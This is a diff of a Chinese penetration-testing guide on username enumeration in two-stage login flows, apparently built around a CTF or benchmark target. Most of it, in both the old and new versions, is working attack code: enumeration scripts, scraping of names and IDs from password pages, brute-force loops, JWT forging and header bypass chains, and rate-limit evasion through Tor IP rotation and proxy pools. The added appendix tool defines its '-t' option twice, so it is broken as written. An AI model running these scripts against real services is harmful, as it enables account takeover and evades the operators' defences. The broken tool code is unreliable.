@@ -1,765 +1,470 @@
 # 两阶段认证账户枚举攻击方法论
 
+## 第一部分：文档概述
+
+### 1.1 编写目的
+本文档为渗透测试人员提供一套标准化、可复现的两阶段认证账户枚举攻击流程，用于检测和利用多步骤登录流程中的信息泄露漏洞。通过系统性的方法论，帮助测试人员发现并验证账户枚举漏洞，为后续暴力破解和凭证填充攻击提供目标用户列表。
+
+### 1.2 适用范围
+本文档适用于以下场景：
+- 两阶段或多阶段登录流程（先用户名后密码）
+- 分步注册流程（先邮箱后验证码）
+- 密码重置流程（先用户名后安全问题）
+- 账户验证流程（先输入账号后选择验证方式）
+- Flask/Python/Django 等 Web 应用的分步认证实现
+
+### 1.3 读者对象
+- 执行渗透测试的安全工程师
+- 进行代码审计的安全分析师
+- 负责认证系统开发的开发人员
+- CTF 竞赛参与者
+
 ---
 
-# 第一部分：文档概述
+## 第二部分：核心渗透技术专题
 
-## 1.1 编写目的
+### 专题一：两阶段认证账户枚举攻击
 
-本文档旨在为渗透测试人员提供一套标准化的两阶段认证账户枚举检测与利用流程，帮助识别和利用两阶段登录流程中的账户信息泄露漏洞。
+#### 2.1 技术介绍
 
-## 1.2 适用范围
+两阶段认证（Two-Stage Authentication）是指将传统的一步登录流程拆分为多个步骤，通常第一步验证用户名存在性，第二步验证密码。这种设计本意是提供更好的用户体验（如显示用户头像、个性化欢迎语），但往往会引入账户枚举漏洞。
 
-本文档适用于所有使用两阶段认证流程的 Web 应用，特别是：
-- 先验证用户名、再验证密码的登录流程
-- 用户名和密码分页面输入的认证系统
-- 在不同阶段返回差异化响应的认证系统
+**漏洞本质：**
+- 应用在不同阶段返回不同的响应，暴露了用户名是否存在的信息
+- 第一步查询数据库验证用户名，但未做速率限制
+- 第二步密码验证前，页面已显示用户敏感信息（如姓名、用户 ID）
 
-## 1.3 读者对象
-
-本文件主要面向执行渗透测试任务的安全工程师、安全分析师。
-
----
-
-# 第二部分：核心渗透技术专题
-
-## 2.1 技术介绍
-
-### 漏洞原理
-
-两阶段认证账户枚举是指应用程序在分步认证流程中，通过不同的响应行为（重定向、错误消息、页面内容等）泄露用户名是否存在的信息。
-
-**本质问题**：
-- 第一阶段（用户名验证）返回差异化响应
-- 有效用户名重定向到密码页面
-- 无效用户名显示错误消息
-- 攻击者可通过响应差异判断用户名有效性
-
-### 两阶段认证流程
-
+**攻击原理：**
 ```
-阶段 1：用户名验证
-  用户提交用户名 → 系统检查是否存在 → 
-    - 存在：重定向到密码页面
-    - 不存在：显示"用户不存在"错误
+正常流程：
+步骤 1：输入用户名 → 查询数据库 → 用户存在 → 显示密码页面（含用户信息）
+                                    → 用户不存在 → 返回错误/重定向
 
-阶段 2：密码验证
-  用户提交密码 → 系统验证密码 →
-    - 正确：创建会话，登录成功
-    - 错误：显示"密码错误"
+攻击流程：
+攻击者批量提交用户名 → 观察响应差异 → 区分有效/无效用户名 → 建立有效用户列表 → 针对性暴力破解
 ```
 
-### 常见 CWE 映射
-
-| CWE 编号 | 描述 |
-|---------|------|
-| CWE-204 | 响应中可观察到的差异 |
-| CWE-200 | 敏感信息暴露 |
-| CWE-287 | 身份验证不当 |
-
-## 2.2 攻击常见于哪些业务场景
+#### 2.2 攻击常见于哪些业务场景
 
 | 业务场景 | 功能示例 | 风险点描述 |
 |---------|---------|-----------|
-| 企业登录 | 先输入用户名 → SSO 跳转 | 用户名存在性判断 |
-| 银行系统 | 用户名页 → 密码页 → 安全问题 | 多阶段信息泄露 |
-| 云服务 | 邮箱验证 → 密码验证 → MFA | 每阶段响应不同 |
-| 社交网络 | 用户名/邮箱 → 密码 | 差异化错误消息 |
-| CTF 平台 | 用户名验证 → 密码验证 | 两阶段响应差异 |
+| 两阶段登录 | 先用户名后密码 | 用户名存在时跳转到密码页，不存在时返回错误 |
+| 分步注册 | 先邮箱后验证码 | 邮箱已注册时提示，未注册时发送验证码 |
+| 密码重置 | 先用户名后安全问题 | 用户名存在时显示安全问题，不存在时提示错误 |
+| 账户恢复 | 先邮箱后恢复链接 | 邮箱存在时发送链接，不存在时不响应 |
+| 企业门户 | 先工号后密码 | 工号存在时显示员工姓名和部门 |
 
-## 2.3 漏洞发现方法
+#### 2.3 漏洞探测方法
 
-### 2.3.1 黑盒测试
+##### 2.3.1 黑盒测试
 
-**响应代码分析**：
-
+**步骤 1：手动测试响应差异**
 ```bash
-# 测试有效用户名
-curl -X POST http://target.com/ \
-  -d "username=test" \
-  -v
+# 测试已知有效用户名
+curl -i -X POST http://target/login \
+  -d "username=test"
 
 # 预期响应（用户存在）：
-# HTTP/1.1 302 Found
+# HTTP/1.1 302 FOUND
 # Location: /password/test
 
 # 测试无效用户名
-curl -X POST http://target.com/ \
-  -d "username=nonexistent123" \
-  -v
+curl -i -X POST http://target/login \
+  -d "username=nonexistent"
 
 # 预期响应（用户不存在）：
 # HTTP/1.1 200 OK
-# 页面包含 "User not found"
+# Content: User not found
 ```
 
-**响应内容分析**：
+**步骤 2：分析响应差异指标**
 
-```bash
-# 比较两种响应的差异
-curl -s -X POST http://target.com/ -d "username=test" > valid_response.html
-curl -s -X POST http://target.com/ -d "username=invalid" > invalid_response.html
+| 差异类型 | 有效用户 | 无效用户 | 可利用性 |
+|---------|---------|---------|---------|
+| HTTP 状态码 | 302 重定向 | 200 OK | 高 |
+| Location 头 | /password/{username} | / | 高 |
+| 响应长度 | 1500 bytes | 1200 bytes | 中 |
+| 响应时间 | 50ms | 10ms | 中 |
+| 页面内容 | "Welcome, John!" | "User not found" | 高 |
+| Cookie 设置 | session=xxx | 无 | 中 |
 
-# 使用 diff 比较
-diff valid_response.html invalid_response.html
-
-# 关键差异点：
-# - HTTP 状态码（302 vs 200）
-# - 页面标题
-# - 错误消息
-# - 重定向行为
-```
-
-**响应时间分析**：
-
+**步骤 3：自动化枚举测试**
 ```python
-#!/usr/bin/env python3
-"""
-通过响应时间差异判断用户名是否存在
-"""
-
 import requests
-import time
 
-def check_username_timing(target_url, username):
-    """通过响应时间判断用户名是否存在"""
-    start = time.time()
-    response = requests.post(target_url, data={'username': username})
-    elapsed = time.time() - start
-    
-    # 数据库查询通常比立即返回错误慢
-    if response.status_code == 302:
-        return True, f"Redirect ({elapsed:.3f}s)"
-    elif elapsed > 0.5:  # 阈值根据实际情况调整
-        return True, f"Slow response ({elapsed:.3f}s) - likely DB query"
-    else:
-        return False, f"Fast response ({elapsed:.3f}s) - likely invalid"
-
-def main():
-    target_url = 'http://target.com/'
-    usernames = ['test', 'admin', 'nonexistent123']
+def enumerate_users(target, usernames):
+    valid_users = []
     
     for username in usernames:
-        exists, reason = check_username_timing(target_url, username)
-        status = "[VALID]" if exists else "[INVALID]"
-        print(f"{status} {username}: {reason}")
-
-if __name__ == '__main__':
-    main()
-```
-
-### 2.3.2 自动化枚举脚本
-
-```python
-#!/usr/bin/env python3
-"""
-两阶段认证账户枚举攻击脚本
-"""
-
-import requests
-import sys
-import time
-
-class TwoStageEnumerator:
-    def __init__(self, base_url):
-        self.base_url = base_url
-        self.session = requests.Session()
-        self.valid_users = []
-        self.invalid_users = []
-    
-    def check_username(self, username):
-        """
-        检查用户名是否存在
-        返回：(是否存在，响应状态码，响应特征)
-        """
-        try:
-            response = self.session.post(
-                f'{self.base_url}/',
-                data={'username': username},
-                allow_redirects=False
-            )
-            
-            # 判断标准 1：HTTP 状态码
-            if response.status_code == 302:
-                return True, response.status_code, "Redirect to password page"
-            
-            # 判断标准 2：响应内容
-            if 'not found' in response.text.lower():
-                return False, response.status_code, "User not found message"
-            
-            if 'User not found' in response.text:
-                return False, response.status_code, "User not found message"
-            
-            # 判断标准 3：重定向头
-            location = response.headers.get('Location', '')
-            if '/password/' in location:
-                return True, response.status_code, f"Redirect to {location}"
-            
-            # 未知响应
-            return None, response.status_code, "Unknown response"
-            
-        except Exception as e:
-            return None, 0, str(e)
-    
-    def enumerate(self, usernames, delay=0.1):
-        """批量枚举用户名"""
-        print(f"[*] Starting enumeration of {len(usernames)} usernames...")
-        print(f"[*] Target: {self.base_url}")
-        print()
-        
-        for i, username in enumerate(usernames):
-            exists, status_code, reason = self.check_username(username)
-            
-            if exists:
-                print(f"[VALID]   {username} (HTTP {status_code}) - {reason}")
-                self.valid_users.append(username)
-            elif exists is False:
-                print(f"[INVALID] {username} (HTTP {status_code}) - {reason}")
-                self.invalid_users.append(username)
-            else:
-                print(f"[UNKNOWN] {username} (HTTP {status_code}) - {reason}")
-            
-            # 避免触发速率限制
-            time.sleep(delay)
-        
-        return self.valid_users
-    
-    def save_results(self, filename='enumerated_users.txt'):
-        """保存枚举结果"""
-        with open(filename, 'w') as f:
-            for user in self.valid_users:
-                f.write(f"{user}\n")
-        print(f"[*] Saved {len(self.valid_users)} valid users to {filename}")
-
-def main():
-    if len(sys.argv) < 3:
-        print("Usage: python two_stage_enum.py <base_url> <userlist>")
-        print("Example: python two_stage_enum.py http://target.com usernames.txt")
-        sys.exit(1)
-    
-    base_url = sys.argv[1]
-    userlist = sys.argv[2]
-    
-    # 读取用户名列表
-    with open(userlist, 'r') as f:
-        usernames = [line.strip() for line in f if line.strip()]
-    
-    enumerator = TwoStageEnumerator(base_url)
-    valid_users = enumerator.enumerate(usernames)
-    
-    print(f"\n[*] Enumeration complete!")
-    print(f"[+] Found {len(valid_users)} valid users:")
-    for user in valid_users:
-        print(f"  - {user}")
-    
-    enumerator.save_results()
-
-if __name__ == '__main__':
-    main()
-```
-
-### 2.3.3 白盒测试
-
-**代码审计要点**：
-
-```python
-# ❌ 漏洞代码示例
-@app.route('/', methods=['GET', 'POST'])
-def login():
-    if request.method == 'POST':
-        username = request.form['username']
-        user = User.query.filter_by(username=username).first()
-        
-        if user is None:
-            # 泄露：用户不存在
-            return render_template('login.html', error='User not found')
-        
-        # 泄露：用户存在（重定向到密码页）
-        return redirect(url_for('password', username=username))
-
-# ✅ 安全代码示例
-@app.route('/', methods=['GET', 'POST'])
-def login():
-    if request.method == 'POST':
-        username = request.form['username']
-        password = request.form.get('password')
-        
-        # 统一验证逻辑
-        user = User.query.filter_by(username=username).first()
-        
-        if user and user.password == password:
-            session['user_id'] = user.id
-            return redirect(url_for('dashboard'))
-        else:
-            # 统一错误消息
-            return render_template('login.html', 
-                                 error='Invalid username or password')
-```
-
-**日志分析**：
-
-```bash
-# 检查应用日志中是否有枚举痕迹
-grep "User not found" /var/log/app/*.log
-grep "redirect to password" /var/log/app/*.log
-
-# 检查访问日志中的枚举攻击
-grep "POST /" access.log | grep "username=" | sort | uniq -c | sort -rn
-```
-
-## 2.4 漏洞利用方法
-
-### 2.4.1 基础账户枚举
-
-```bash
-# 使用常见用户名列表进行枚举
-cat <<EOF > usernames.txt
-test
-admin
-administrator
-root
-user
-guest
-demo
-info
-support
-sales
-marketing
-webmaster
-postmaster
-EOF
-
-# 执行枚举
-python two_stage_enum.py http://target.com usernames.txt
-```
-
-### 2.4.2 结合密码页面信息泄露
-
-```python
-#!/usr/bin/env python3
-"""
-结合两阶段认证和密码页面信息泄露
-获取用户名 → 用户 ID → 真实姓名的完整映射
-"""
-
-import requests
-import re
-
-BASE_URL = 'http://target.com'
-
-def get_user_info(username):
-    """从密码页面获取用户信息"""
-    session = requests.Session()
-    
-    # 阶段 1：用户名验证
-    session.post(f'{BASE_URL}/',
-                data={'username': username},
-                allow_redirects=False)
-    
-    # 阶段 2：访问密码页面获取信息
-    response = session.get(f'{BASE_URL}/password/{username}')
-    
-    info = {
-        'username': username,
-        'user_id': None,
-        'first_name': None
-    }
-    
-    # 提取用户 ID
-    id_match = re.search(r'name="user_id" value="(\d+)"', response.text)
-    if id_match:
-        info['user_id'] = id_match.group(1)
-    
-    # 提取真实姓名
-    name_match = re.search(r'Welcome, ([^!]+)!', response.text)
-    if name_match:
-        info['first_name'] = name_match.group(1)
-    
-    return info
-
-def main():
-    # 通过枚举获得的有效用户名
-    valid_users = ['test', 'admin', 'flag']
-    
-    print("Collecting user information from password pages...")
-    print()
-    
-    for username in valid_users:
-        info = get_user_info(username)
-        if info['user_id']:
-            print(f"[+] {username}:")
-            print(f"    User ID: {info['user_id']}")
-            print(f"    First Name: {info['first_name']}")
-            print()
-
-if __name__ == '__main__':
-    main()
-```
-
-### 2.4.3 暴力破解攻击
-
-```python
-#!/usr/bin/env python3
-"""
-结合账户枚举和暴力破解攻击
-"""
-
-import requests
-import time
-
-BASE_URL = 'http://target.com'
-
-# 通过枚举获得的有效用户名
-VALID_USERS = ['test', 'admin']
-
-# 常见密码列表
-PASSWORDS = [
-    'password', '123456', 'admin', 'test', 'qwerty',
-    'letmein', 'welcome', 'monkey', 'dragon', 'master'
-]
-
-def bruteforce_user(username, passwords):
-    """对指定用户进行密码爆破"""
-    print(f"[*] Bruteforcing user: {username}")
-    
-    session = requests.Session()
-    
-    for password in passwords:
-        # 阶段 1：用户名验证（只需执行一次）
-        session.post(f'{BASE_URL}/',
-                    data={'username': username},
-                    allow_redirects=False)
-        
-        # 阶段 2：密码验证
-        response = session.post(
-            f'{BASE_URL}/password/{username}',
-            data={'password': password},
+        response = requests.post(
+            f"{target}/",
+            data={"username": username},
             allow_redirects=False
         )
         
-        # 检查是否登录成功
+        # 判断标准 1：HTTP 302 重定向
         if response.status_code == 302:
-            location = response.headers.get('Location', '')
-            if 'dashboard' in location:
-                print(f"[SUCCESS] {username}:{password}")
-                return session
+            print(f"[+] Valid user: {username} (302 redirect)")
+            valid_users.append(username)
+            continue
         
-        time.sleep(0.1)  # 避免触发速率限制
+        # 判断标准 2：响应中包含特定文本
+        if "Welcome" in response.text or "password" in response.text.lower():
+            print(f"[+] Valid user: {username} (response content)")
+            valid_users.append(username)
+            continue
+        
+        # 判断标准 3：响应长度差异
+        if len(response.text) > 1000:  # 阈值需根据实际情况调整
+            print(f"[+] Valid user: {username} (response length)")
+            valid_users.append(username)
     
-    print(f"[-] Failed to crack password for {username}")
+    return valid_users
+
+# 使用示例
+usernames = ["admin", "test", "user", "root", "administrator"]
+valid = enumerate_users("http://localhost:44191", usernames)
+print(f"\nFound {len(valid)} valid users: {valid}")
+```
+
+##### 2.3.2 白盒测试
+
+**代码审计要点：**
+
+1. **查找两阶段认证实现**
+```bash
+# Python/Flask
+grep -r "password/<username>" .
+grep -r "/password/" .
+
+# Django
+grep -r "password_confirm" .
+grep -r "step2" .
+
+# Node.js
+grep -r "login/step1" .
+grep -r "auth/stage2" .
+```
+
+2. **检查用户名验证逻辑**
+```python
+# 危险实现示例（Flask）
+@app.route('/', methods=['POST'])
+def login_step1():
+    username = request.form['username']
+    user = User.query.filter_by(username=username).first()
+    
+    if user:
+        return redirect(url_for('password', username=username))  # 暴露用户存在
+    else:
+        return render_template('login.html', error='User not found')  # 暴露用户不存在
+```
+
+3. **检查密码页面信息泄露**
+```python
+# 危险实现示例
+@app.route('/password/<username>')
+def password_page(username):
+    user = User.query.filter_by(username=username).first()
+    if not user:
+        return redirect(url_for('login'))
+    
+    # 泄露用户敏感信息
+    return render_template('password.html',
+                          first_name=user.first_name,  # 泄露姓名
+                          username=username,
+                          user_id=user.id)  # 泄露内部 ID
+```
+
+#### 2.4 漏洞利用方法
+
+##### 2.4.1 基础用户枚举
+
+**方法 1：基于 HTTP 重定向的枚举**
+```bash
+#!/bin/bash
+
+TARGET="http://localhost:44191"
+WORDLIST="/usr/share/wordlists/usernames.txt"
+
+while read username; do
+    response=$(curl -s -o /dev/null -w "%{http_code}" \
+        -X POST "$TARGET/" \
+        -d "username=$username")
+    
+    if [ "$response" == "302" ]; then
+        echo "[+] Valid: $username"
+        echo "$username" >> valid_users.txt
+    fi
+done < "$WORDLIST"
+```
+
+**方法 2：基于响应内容的枚举**
+```python
+import requests
+import concurrent.futures
+
+def check_username(username):
+    session = requests.Session()
+    response = session.post("http://localhost:44191/",
+                          data={"username": username},
+                          allow_redirects=False)
+    
+    # 检查是否重定向到密码页
+    if response.status_code == 302:
+        # 进一步验证：访问密码页获取用户信息
+        password_page = session.get(f"http://localhost:44191/password/{username}",
+                                   allow_redirects=False)
+        
+        if password_page.status_code == 200:
+            # 提取用户信息
+            import re
+            first_name = re.search(r'Welcome, (\w+)!', password_page.text)
+            user_id = re.search(r'name="user_id" value="(\d+)"', password_page.text)
+            
+            return {
+                'username': username,
+                'first_name': first_name.group(1) if first_name else 'N/A',
+                'user_id': user_id.group(1) if user_id else 'N/A'
+            }
+    
     return None
 
-def main():
-    print("[*] Starting brute force attack...")
-    print()
-    
-    for username in VALID_USERS:
-        session = bruteforce_user(username, PASSWORDS)
-        
-        if session:
-            # 登录成功，访问仪表板
-            response = session.get(f'{BASE_URL}/dashboard')
-            if 'FLAG' in response.text:
-                import re
-                flag = re.search(r'FLAG\{[^}]+\}', response.text)
-                if flag:
-                    print(f"[!] FLAG: {flag.group()}")
+# 并发枚举
+usernames = ['admin', 'test', 'flag', 'user', 'root', 'administrator']
+with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+    results = list(executor.map(check_username, usernames))
 
-if __name__ == '__main__':
-    main()
+for result in filter(None, results):
+    print(f"[+] {result['username']}: Name={result['first_name']}, ID={result['user_id']}")
 ```
 
-### 2.4.4 完整攻击链
+##### 2.4.2 预认证信息收集
 
+**利用密码页面泄露的信息：**
+```bash
+# 访问已知用户的密码页面（无需认证）
+curl http://localhost:44191/password/flag
+
+# 响应示例：
+# <p>Welcome, Flag!</p>
+# <input name="username" value="flag" hidden>
+# <input name="user_id" value="10019" hidden>
+
+# 提取的信息：
+# - 用户存在性确认
+# - 用户 first_name: "Flag"
+# - 用户内部 ID: 10019
+```
+
+**信息利用场景：**
+1. **针对性密码喷洒**：使用用户姓名作为密码字典（如 `Flag123`, `flag2024`）
+2. **社会工程学攻击**：利用泄露的姓名进行钓鱼攻击
+3. **IDOR 攻击**：使用获取的用户 ID 进行水平权限提升测试
+
+##### 2.4.3 组合攻击链
+
+**攻击链：枚举 → 暴力破解 → 权限提升**
 ```python
-#!/usr/bin/env python3
-"""
-两阶段认证完整攻击链
-枚举 → 信息收集 → 暴力破解 → 权限绕过
-"""
-
 import requests
-import re
-import time
+import jwt
 
-class TwoStageAttack:
-    def __init__(self, base_url):
-        self.base_url = base_url
-        self.valid_users = {}
+# 步骤 1：枚举有效用户
+def enumerate_users():
+    usernames = ['admin', 'test', 'flag', 'user', 'root']
+    valid = []
     
-    def enumerate_users(self, usernames):
-        """阶段 1：枚举有效用户名"""
-        print("[*] Phase 1: Enumerating valid usernames...")
-        
-        session = requests.Session()
-        for username in usernames:
-            response = session.post(
-                f'{self.base_url}/',
-                data={'username': username},
-                allow_redirects=False
-            )
-            
-            if response.status_code == 302:
-                self.valid_users[username] = {}
-                print(f"[+] Valid user: {username}")
-            
-            time.sleep(0.1)
-        
-        return len(self.valid_users) > 0
+    for username in usernames:
+        r = requests.post("http://localhost:44191/",
+                         data={"username": username},
+                         allow_redirects=False)
+        if r.status_code == 302:
+            valid.append(username)
     
-    def collect_user_info(self):
-        """阶段 2：从密码页面收集用户信息"""
-        print("\n[*] Phase 2: Collecting user information...")
-        
-        session = requests.Session()
-        for username in self.valid_users:
-            # 访问密码页面
-            response = session.get(f'{self.base_url}/password/{username}')
-            
-            # 提取用户 ID
-            id_match = re.search(r'name="user_id" value="(\d+)"', response.text)
-            if id_match:
-                self.valid_users[username]['user_id'] = id_match.group(1)
-                print(f"[+] {username}: ID={self.valid_users[username]['user_id']}")
-            
-            # 提取真实姓名
-            name_match = re.search(r'Welcome, ([^!]+)!', response.text)
-            if name_match:
-                self.valid_users[username]['first_name'] = name_match.group(1)
-    
-    def bruteforce_password(self, username, passwords):
-        """阶段 3：暴力破解密码"""
-        print(f"\n[*] Phase 3: Bruteforcing password for {username}...")
-        
-        session = requests.Session()
-        
-        # 阶段 1：用户名验证
-        session.post(f'{self.base_url}/',
-                    data={'username': username},
-                    allow_redirects=False)
-        
-        for password in passwords:
-            response = session.post(
-                f'{self.base_url}/password/{username}',
-                data={'password': password},
-                allow_redirects=False
-            )
-            
-            if response.status_code == 302:
-                print(f"[+] Found password: {password}")
-                return session
-            
-            time.sleep(0.1)
-        
-        return None
-    
-    def access_target_data(self, session, target_user_id):
-        """阶段 4：访问目标数据（利用 X-UserId 绕过）"""
-        print(f"\n[*] Phase 4: Accessing target data (ID: {target_user_id})...")
-        
-        response = session.get(
-            f'{self.base_url}/dashboard',
-            headers={'X-UserId': str(target_user_id)}
-        )
-        
-        if 'FLAG' in response.text:
-            flag = re.search(r'FLAG\{[^}]+\}', response.text)
-            if flag:
-                print(f"[!] FLAG FOUND: {flag.group()}")
-                return flag.group()
-        
-        return None
-    
-    def run_full_attack(self, usernames, passwords, target_username):
-        """执行完整攻击"""
-        if not self.enumerate_users(usernames):
-            print("[-] No valid users found")
-            return None
-        
-        self.collect_user_info()
-        
-        # 尝试破解每个用户的密码
-        for username in self.valid_users:
-            session = self.bruteforce_password(username, passwords)
-            
-            if session and target_username in self.valid_users:
-                target_id = self.valid_users[target_username].get('user_id')
-                if target_id:
-                    flag = self.access_target_data(session, target_id)
-                    if flag:
-                        return flag
-        
-        return None
+    return valid
 
-def main():
-    # 配置
-    BASE_URL = 'http://target.com'
+# 步骤 2：对有效用户进行暴力破解
+def brute_force(username):
+    passwords = ['123456', 'password', username, f'{username}123']
     
-    # 用户名列表
-    USERNAMES = ['test', 'admin', 'user', 'flag']
+    for password in passwords:
+        r = requests.post(f"http://localhost:44191/password/{username}",
+                         data={"username": username, "password": password},
+                         allow_redirects=False)
+        if r.status_code == 302 and '/dashboard' in r.headers.get('Location', ''):
+            print(f"[+] Cracked: {username}:{password}")
+            return True
     
-    # 密码列表
-    PASSWORDS = ['password', '123456', 'admin', 'test', 'qwerty']
-    
-    # 目标用户（包含 flag 的用户）
-    TARGET = 'flag'
-    
-    attacker = TwoStageAttack(BASE_URL)
-    flag = attacker.run_full_attack(USERNAMES, PASSWORDS, TARGET)
-    
-    if flag:
-        print(f"\n[+] Attack successful! Flag: {flag}")
-    else:
-        print("\n[-] Attack failed")
+    return False
 
-if __name__ == '__main__':
-    main()
+# 步骤 3：JWT 伪造（如果签名验证被禁用）
+def forge_jwt(target_user_id):
+    forged_payload = {"username": "attacker", "user_id": target_user_id}
+    forged_token = jwt.encode(forged_payload, "any_secret", algorithm="HS256")
+    return forged_token
+
+# 执行攻击链
+valid_users = enumerate_users()
+print(f"Valid users: {valid_users}")
+
+for user in valid_users:
+    brute_force(user)
+
+# 直接 JWT 伪造（如果适用）
+forged_jwt = forge_jwt(10019)
+print(f"Forged JWT: {forged_jwt}")
 ```
 
-## 2.5 漏洞利用绕过方法
+#### 2.5 漏洞利用绕过方法
 
-### 2.5.1 绕过速率限制
+##### 2.5.1 绕过速率限制
 
+**场景：应用有基础速率限制但不够严格**
+
+**方法 1：慢速枚举**
 ```python
-# 如果存在速率限制，使用以下技巧
-
 import time
 import random
 
-def stealth_enumerate(target_url, usernames):
-    """隐蔽枚举，绕过速率限制"""
+def slow_enumerate(usernames):
+    for username in usernames:
+        response = requests.post("http://target/", data={"username": username})
+        
+        # 随机延迟 1-3 秒
+        time.sleep(random.uniform(1, 3))
+        
+        if response.status_code == 302:
+            print(f"[+] Valid: {username}")
+```
+
+**方法 2：IP 轮换**
+```python
+from stem import Signal
+from stem.control import Controller
+import requests
+
+def rotate_tor_ip():
+    with Controller.from_port(port=9051) as controller:
+        controller.authenticate(password='your_password')
+        controller.signal(Signal.NEWNYM)
+
+def enumerate_with_tor(usernames):
+    proxies = {'http': 'socks5://127.0.0.1:9050',
+               'https': 'socks5://127.0.0.1:9050'}
     
     for i, username in enumerate(usernames):
-        # 随机延迟 1-5 秒
-        time.sleep(random.uniform(1.0, 5.0))
+        if i % 5 == 0:  # 每 5 个请求切换一次 IP
+            rotate_tor_ip()
         
-        # 每 10 个请求插入一个正常请求
-        if i % 10 == 0:
-            requests.get(f'{target_url}/static/css/style.css')
-        
-        # 执行枚举
-        check_username(target_url, username)
+        response = requests.post("http://target/",
+                                data={"username": username},
+                                proxies=proxies)
 ```
 
-### 2.5.2 分布式枚举
+##### 2.5.2 绕过响应长度混淆
 
+**场景：应用返回相同 HTTP 状态码，但响应内容有细微差异**
+
+**方法：基于时序分析的枚举**
 ```python
-# 使用多个 IP 地址进行分布式枚举
 import requests
-from multiprocessing import Pool
+import statistics
 
-def check_username_with_proxy(args):
-    username, proxy = args
-    response = requests.post(
-        'http://target.com/',
-        data={'username': username},
-        proxies=proxy,
-        allow_redirects=False
-    )
-    return username, response.status_code
-
-# 代理池
-proxies = [
-    {'http': 'http://proxy1:8080'},
-    {'http': 'http://proxy2:8080'},
-    {'http': 'http://proxy3:8080'},
-]
-
-# 分发任务
-usernames = ['test', 'admin', 'user1', 'user2']
-tasks = [(u, proxies[i % len(proxies)]) for i, u in enumerate(usernames)]
-
-with Pool(len(proxies)) as p:
-    results = p.map(check_username_with_proxy, tasks)
+def timing_based_enumeration(username):
+    times = []
+    
+    # 发送多次请求，计算平均响应时间
+    for _ in range(5):
+        start = time.time()
+        requests.post("http://target/", data={"username": username})
+        end = time.time()
+        times.append(end - start)
+    
+    avg_time = statistics.mean(times)
+    
+    # 数据库查询通常比直接返回错误慢
+    if avg_time > 0.05:  # 阈值需根据实际情况调整
+        print(f"[+] Valid: {username} (avg: {avg_time*1000:.2f}ms)")
 ```
 
-### 2.5.3 被动信息收集
+---
 
+## 第三部分：附录
+
+### 3.1 常用 Payload 速查表
+
+| 类别 | 测试点 | Payload 示例 | 说明 |
+|-----|-------|------------|------|
+| 用户名枚举 | POST / | `username=admin` | 测试常见用户名 |
+| 用户名枚举 | POST / | `username=test` | 测试测试账户 |
+| 信息收集 | GET /password/{user} | 直接访问 | 获取用户姓名和 ID |
+| 暴力破解 | POST /password/{user} | `password={username}` | 用户名作密码 |
+| 暴力破解 | POST /password/{user} | `password=123456` | 常见弱密码 |
+
+### 3.2 自动化工具
+
+**Custom Python Script:**
 ```python
-# 从公开资源收集用户名
-import requests
-import re
+#!/usr/bin/env python3
+"""
+Two-Stage Authentication Enumerator
+Usage: python3 two_stage_enum.py -t http://target -w usernames.txt
+"""
 
-def passive_recon(target_domain):
-    """被动收集用户名信息"""
+import argparse
+import requests
+from concurrent.futures import ThreadPoolExecutor
+
+def check_user(target, username):
+    session = requests.Session()
+    r = session.post(f"{target}/", data={"username": username}, allow_redirects=False)
     
-    # Google Dorking
-    dorks = [
-        f'site:{target_domain} "username"',
-        f'site:{target_domain} "user_id"',
-        f'site:{target_domain} inurl:/password/',
-    ]
+    if r.status_code == 302:
+        # 获取用户信息
+        info_page = session.get(f"{target}/password/{username}")
+        
+        import re
+        name_match = re.search(r'Welcome, (\w+)!', info_page.text)
+        id_match = re.search(r'user_id" value="(\d+)"', info_page.text)
+        
+        name = name_match.group(1) if name_match else 'N/A'
+        uid = id_match.group(1) if id_match else 'N/A'
+        
+        return f"[+] {username}: Name={name}, ID={uid}"
     
-    for dork in dorks:
-        response = requests.get(f'https://www.google.com/search?q={dork}')
-        # 提取结果中的用户名
-        usernames = re.findall(r'/password/(\w+)', response.text)
-        for user in usernames:
-            print(f"[PASSIVE] Found user: {user}")
+    return None
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-t', '--target', required=True)
+    parser.add_argument('-w', '--wordlist', required=True)
+    parser.add_argument('-t', '--threads', type=int, default=10)
+    args = parser.parse_args()
+    
+    with open(args.wordlist) as f:
+        usernames = [line.strip() for line in f]
+    
+    with ThreadPoolExecutor(max_workers=args.threads) as executor:
+        results = list(executor.map(
+            lambda u: check_user(args.target, u),
+            usernames
+        ))
+    
+    for result in filter(None, results):
+        print(result)
 
 if __name__ == '__main__':
-    passive_recon('target.com')
+    main()
 ```
+
+### 3.3 参考资源
+
+- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
+- [OWASP Credential Enumeration](https://owasp.org/www-community/attacks/Username_enumeration)
+- [PortSwigger - Username Enumeration](https://portswigger.net/web-security/authentication)
 
 ---
 
-# 第三部分：附录
-
-## 3.1 两阶段认证枚举检测检查清单
-
-```
-□ 测试 HTTP 状态码差异（302 vs 200）
-□ 测试响应内容差异（错误消息）
-□ 测试重定向行为差异
-□ 测试响应时间差异
-□ 测试页面标题差异
-□ 测试 Cookie 设置差异
-□ 测试 JavaScript 行为差异
-```
-
-## 3.2 常见用户名列表
-
-```
-# 基础用户名
-test
-admin
-administrator
-root
-user
-guest
-demo
-
-# 企业常见
-john
-jane
-admin
-support
-info
-contact
-webmaster
-postmaster
-
-# CTF 常见
-flag
-ctf
-secret
-hidden
-backup
-oracle
-mysql
-```
-
-## 3.3 修复建议
-
-1. **统一响应** - 无论用户名是否存在都返回相同响应
-2. **合并认证阶段** - 使用单阶段用户名 + 密码认证
-3. **模糊错误消息** - 使用"用户名或密码错误"等模糊提示
-4. **速率限制** - 对登录接口实施速率限制
-5. **验证码机制** - 在多次失败后要求验证码
-6. **账户锁定** - 多次失败后临时锁定账户
-
----
-
-**文档版本**：1.0
-**最后更新**：2026-03-08
-**参考来源**：XBEN-003-24 渗透测试实战
+**文档版本：** 1.0  
+**最后更新：** 2026 年 3 月 14 日  
+**适用技能：** authentication-failures, broken-access-control
